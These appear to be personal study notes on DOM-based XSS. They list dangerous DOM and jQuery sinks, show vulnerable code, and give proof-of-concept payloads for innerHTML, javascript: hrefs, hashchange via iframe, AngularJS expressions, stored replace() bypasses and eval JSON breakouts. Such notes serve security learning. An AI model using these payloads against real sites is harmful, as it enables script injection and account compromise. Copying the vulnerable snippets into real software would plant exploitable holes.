# Common sinks
 The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:

document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()

# The innerHTML sink
The `innerHTML` HTML DOM property can allow for DOM-based XSS injections.
```
document.getElementById("demo").innerHTML = "Paragraph changed!"; 
```

Example injection: 
```
<img src=1 onerror=alert(1)>
```

# The jQuery anchor `href` attribute sink
Sometimes, jQuery has attributes that take values from user-controlled inputs (sources) like `location.search` (the URL parameters)

Example (vulnerable code):
```
$(function(){
$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
}); 
```

Inject: 
```
?returnUrl=javascript:alert(document.domain) 
```

Clicking on the backlink will execute the javascript `alert()`

# The jQuery $() selector function sink
A classic vulnerability occurs when using the `location.hash` source for animations or auto-scrolling to a particular element on the page. This was often implemented with a vulnerable `hashchange` event handler: 

```
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
}); 
```

Because the `hash` is user-controlled, an XSS payload can be injected. However, you need to find a way to trigger the `hashchange` event without user interaction. One way is to use an `iframe` to append the payload `onload`:

```
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'"> 
```


# The AngularJS expressions sink
When a site uses AngularJS and the `ng-app` attribute on an HTML element, it will be processed by AngularJS. AngularJS will execute any JavaScript inside double curly braces that can occur in HTML or attributes.

![[cd696b8b51e893072a852e8ec73d87de-1.png]]

Example payloads:
```
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
```

# Stored DOM XSS
In a Stored DOM vulnerability, the server receives data from one request, stores it, and then includes the data in a later response. A script within the later response contains a sink which then processes the data in an unsafe way. 

Sometimes, functions in JS are used to attempt escaping dangerous characters, but they may be faulty. The example below uses `replace()`, which only replaces the FIRST occurence of the characters, so just add extra angle brackets at the beginning of the payload to inject stored malicious HTML.

![[eee4b759ff1922904d7057154831e09c-1.png]]

Payload: 
```
<><img+src/onerror%3dalert(1)>
```

# Reflected DOM XSS
Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink. 

Sometimes, JSON objects in a response are used in `eval()` functions, and this is dangerous if the JSON object can be manipulated. For example, not escaping backslashes can lead to direct control of the JSON object. 

![[9d8b5e842d4084e9720d05d5d8b38711-1.png]]

Payload: 
```
\"-alert(1)}//
```

Response generated will trigger XSS within `eval()`: 
![[b43b1add704af795a6244c3a788bd4c6-1.png]]